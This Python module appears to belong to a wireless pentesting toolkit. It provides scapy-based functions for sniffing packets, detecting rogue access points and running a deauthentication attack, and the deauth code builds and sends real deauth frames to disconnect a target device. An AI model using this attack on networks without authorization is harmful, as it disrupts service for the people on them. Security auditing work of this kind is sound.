"""
modules/pentesting_tools/wireless_auditing_tools.py

Implements tools for auditing wireless networks, identifying vulnerabilities, and detecting unauthorized access points.
"""

from scapy.all import *
import os
import time
from threading import Thread


class WirelessAuditor:
    """
    A class for performing wireless network audits, including sniffing, deauth attacks, and identifying rogue access points.
    """

    @staticmethod
    def list_interfaces():
        """
        Lists available network interfaces for wireless operations.
        :return: A list of wireless interfaces.
        """
        try:
            print("Fetching available wireless interfaces...")
            interfaces = os.popen("iwconfig 2>/dev/null | grep 'IEEE' | awk '{print $1}'").read().strip().split('\n')
            print(f"Found interfaces: {interfaces}")
            return interfaces
        except Exception as e:
            print(f"Error fetching interfaces: {e}")
            return []

    @staticmethod
    def sniff_packets(interface: str, timeout: int = 10):
        """
        Sniffs wireless packets on a given interface.
        :param interface: The wireless interface to sniff on.
        :param timeout: Duration to capture packets in seconds.
        """
        print(f"Sniffing packets on interface {interface} for {timeout} seconds...")
        try:
            packets = sniff(iface=interface, timeout=timeout)
            print(f"Captured {len(packets)} packets.")
            for packet in packets:
                print(packet.summary())
        except Exception as e:
            print(f"Error sniffing packets: {e}")

    @staticmethod
    def deauth_attack(target_mac: str, ap_mac: str, interface: str):
        """
        Performs a deauthentication attack to disconnect a target device from an access point.
        :param target_mac: MAC address of the target device.
        :param ap_mac: MAC address of the access point.
        :param interface: The wireless interface to use.
        """
        print(f"Initiating deauthentication attack on target {target_mac} via AP {ap_mac}...")
        try:
            pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
            sendp(pkt, iface=interface, count=100, inter=0.1, verbose=0)
            print(f"Deauthentication attack on {target_mac} completed.")
        except Exception as e:
            print(f"Error during deauthentication attack: {e}")

    @staticmethod
    def detect_rogue_ap(interface: str, known_aps: list, timeout: int = 10):
        """
        Detects rogue access points by comparing found APs with a known list.
        :param interface: Wireless interface to scan.
        :param known_aps: List of known access point MAC addresses.
        :param timeout: Duration to scan for access points.
        """
        print(f"Scanning for rogue APs on interface {interface}...")
        rogue_aps = []
        try:
            aps = {}
            def packet_handler(pkt):
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr2
                    ssid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden"
                    if bssid not in aps:
                        aps[bssid] = ssid

            sniff(iface=interface, prn=packet_handler, timeout=timeout)
            for bssid, ssid in aps.items():
                if bssid not in known_aps:
                    rogue_aps.append((bssid, ssid))
                    print(f"Rogue AP detected: BSSID: {bssid}, SSID: {ssid}")

            if not rogue_aps:
                print("No rogue APs detected.")
        except Exception as e:
            print(f"Error detecting rogue APs: {e}")
        return rogue_aps


class WirelessAuditTester:
    """
    A class to test the functionalities of WirelessAuditor.
    """

    @staticmethod
    def run_tests():
        """
        Runs a series of wireless auditing tests.
        """
        print("Starting wireless audit tests...")
        interfaces = WirelessAuditor.list_interfaces()
        if not interfaces:
            print("No wireless interfaces found.")
            return

        interface = interfaces[0]
        print(f"Using interface: {interface}")

        # Sniff packets
        WirelessAuditor.sniff_packets(interface=interface, timeout=5)

        # Test rogue AP detection
        known_aps = ["00:11:22:33:44:55", "66:77:88:99:AA:BB"]
        WirelessAuditor.detect_rogue_ap(interface=interface, known_aps=known_aps, timeout=5)

        # Deauth attack (requires actual target and AP)
        # WARNING: Do not use without permission!
        # WirelessAuditor.deauth_attack(target_mac="FF:FF:FF:FF:FF:FF", ap_mac="AA:AA:AA:AA:AA:AA", interface=interface)


if __name__ == "__main__":
    # Example Usage
    WirelessAuditTester.run_tests()
